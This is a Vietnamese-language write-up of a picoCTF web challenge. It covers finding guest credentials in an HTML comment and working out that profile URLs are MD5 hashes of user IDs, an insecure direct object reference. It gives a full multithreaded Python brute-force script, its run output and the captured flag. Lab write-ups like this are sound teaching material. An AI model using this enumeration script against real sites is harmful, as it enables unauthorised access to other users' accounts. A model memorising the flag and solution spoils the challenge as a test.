<img width="973" height="889" alt="image" src="https://github.com/user-attachments/assets/66cd6479-9f40-4d45-b0b7-933fa27b4144" />

Mục tiêu: http://crystal-peak.picoctf.net:50813

Phân loại lỗ hổng: Information Disclosure (Lộ lọt thông tin) & IDOR (Insecure Direct Object Reference: Tham chiếu đối tượng trực tiếp không an toàn).

Mức độ: Trung bình (Medium) 

1. Tóm tắt chiến dịch (Executive Summary)

Mục tiêu là một ứng dụng Web viết bằng Node.js (Express). Quá trình rà quét tự động (Auto-Pwn)
cho thấy ứng dụng có form đăng nhập nhưng không dính lỗi NoSQL Injection.
Thông qua việc phân tích mã nguồn thủ công, một tài khoản Guest đã bị lộ do lập trình viên để quên trong comment HTML.
Sau khi đăng nhập, hệ thống tiếp tục để lộ lỗ hổng IDOR nghiêm trọng khi quản lý phiên đăng nhập bằng mã băm MD5 của User ID.
 Một kịch bản Bruteforce đã được tự động hóa để dò tìm ID của Admin và chiếm đoạt Flag.

3. Các bước khai thác chi tiết (Kill-Chain)

Bước 1: Trinh sát và Phân tích bề mặt (Reconnaissance)

Rà soát mã nguồn thủ công bằng trình duyệt (DevTools: F12), 
phát hiện một comment HTML chứa thông tin nhạy cảm (Information Disclosure):

<img width="1685" height="900" alt="image" src="https://github.com/user-attachments/assets/29a69c20-60af-4df7-b268-96da2cc6574a" />

Bước 2: Xâm nhập bước đầu (Initial Access)

Sử dụng thông tin vừa thu thập được để đăng nhập hợp pháp vào hệ thống.

Ứng dụng chuyển hướng đến trang Profile cá nhân với thông báo:

Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.

<img width="1694" height="825" alt="image" src="https://github.com/user-attachments/assets/3fbecd94-43de-4ff6-b93a-bccfd988b9cd" />

Bước 3: Phân tích lỗ hổng cốt lõi (Vulnerability Analysis)

Phân tích thanh địa chỉ (URL) tại trang Profile:

http://crystal-peak.picoctf.net:50813/profile/user/e93028bdc1aacdfb3687181f2031765d

Đoạn mã e930... bao gồm 32 ký tự hệ Hexadecimal, là dấu hiệu đặc trưng của thuật toán băm MD5.
Kiểm tra giả thuyết: Đem ID của Guest là 3000 đi băm bằng MD5, kết quả trả về chính xác là e93028bdc1aacdfb3687181f2031765d.

Kết luận: Hệ thống mắc lỗi IDOR. Việc phân quyền chỉ dựa vào mã băm MD5 trên URL mà không xác thực lại (Session/Cookie) 
người dùng hiện tại là ai. Nếu đoán được User ID của Admin và băm nó ra MD5, ta có thể xem được hồ sơ của Admin.

Bước 4: Tự động hóa và Cướp cờ (Exploitation)
Việc thử thủ công các ID kinh điển như 0, 1, 2 trả về kết quả User not found.
Để tối ưu hóa, một đoạn script Python đa luồng (Multi-threading) đã được triển khai để Bruteforce toàn bộ các ID từ 1 đến 5000.

Mã nguồn Exploit (idor_bruteforce.py):

[idor_bruteforce.py](https://github.com/user-attachments/files/26701040/idor_bruteforce.py)
import requests
import hashlib
import concurrent.futures
import sys
import re

def exploit_idor(target_url):
    print("[*] BẮT ĐẦU CHIẾN DỊCH BRUTEFORCE IDOR (GIẢI MÃ MD5)...")
    base_url = f"{target_url}/profile/user/"

    def check_id(user_id):
        # Băm ID thành chuỗi MD5 giống hệt thuật toán của trang web
        md5_hash = hashlib.md5(str(user_id).encode()).hexdigest()
        url = base_url + md5_hash

        try:
            res = requests.get(url, timeout=5)
            
            # Nếu trang trả về lỗi 404, hoặc chứa chữ User not found / Insufficient privileges -> Bỏ qua
            if res.status_code == 200 and "User not found" not in res.text and "Guest" not in res.text:
                flag = re.search(r'picoCTF\{.*?\}', res.text)
                if flag:
                    return user_id, md5_hash, flag.group(0)
                else:
                    return user_id, md5_hash, "Có dữ liệu lạ, nhưng chưa thấy cờ."
        except:
            pass
        return None, None, None

    MAX_THREADS = 20 # Bắn 20 luồng cùng lúc cho tốc độ bàn thờ
    # Guest là 3000. Ta sẽ càn quét từ ID 1 đến 5000.
    print("[+] Đang dội bom mã băm MD5 cho ID từ 1 đến 5000...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Nạp đạn: Tạo 5000 nhiệm vụ cùng lúc
        futures = {executor.submit(check_id, i): i for i in range(1, 5000)}
        
        count = 0
        for future in concurrent.futures.as_completed(futures):
            count += 1
            if count % 100 == 0:
                sys.stdout.write(f"\r[*] Đã quét {count}/5000 IDs...")
                sys.stdout.flush()
                
            uid, md5_hash, result = future.result()
            
            # Xử lý khi có báo cáo phát hiện mục tiêu
            if uid:
                print(f"\n\n[!!!] BINGO! PHÁT HIỆN TÀI KHOẢN ADMIN TẠI ID: {uid}")
                print(f"   -> URL xâm nhập: {base_url}{md5_hash}")
                if "picoCTF" in result:
                    print(f"=== CỜ CỦA BẠN LÀ ===\n🏆 {result} 🏆\n")
                    executor.shutdown(wait=False, cancel_futures=True)
                    return True
                else:
                    print(f"   -> Nội dung đáng ngờ: {result}")

    print("\n[-] Quét hoàn tất. Không tìm thấy ID nào chứa Flag trong khoảng 1-5000.")
    return False

if __name__ == "__main__":
    # Dùng để chạy độc lập không cần qua main.py
    target = "http://crystal-peak.picoctf.net:57935/"
    exploit_idor(target)    

Chạy kịch bản trên, máy tính tự động tạo mã băm và gửi Request liên tục. 
Khi chạm đến ID chính xác của Admin, máy chủ đã phản hồi lại trang Profile cấp cao chứa Flag: picoCTF{...}. 
Chiến dịch thành công.

Sau khi chạy , Terminal hiển thị : PS F:\RUANYY\Tool\Tool Web1> python idor_bruteforce.py
[*] BẮT ĐẦU CHIẾN DỊCH BRUTEFORCE IDOR (GIẢI MÃ MD5)...
[+] Đang dội bom mã băm MD5 cho ID từ 1 đến 5000...
[*] Đã quét 3000/5000 IDs...

[!!!] BINGO! PHÁT HIỆN TÀI KHOẢN ADMIN TẠI ID: 3012
   -> URL xâm nhập: http://crystal-peak.picoctf.net:57935//profile/user/5a01f0597ac4bdf35c24846734ee9a76
=== CỜ CỦA BẠN LÀ ===
🏆 picoCTF{id0r_unl0ck_8b02a9fd} 🏆

PS F:\RUANYY\Tool\Tool Web1> 

Cảm ơn các bạn đã đọc bài viết này . Chúc các bạn giải thử thách thành công và hiểu thêm kiến thức của bài này . Wish you have all the best !!!!!!!!!
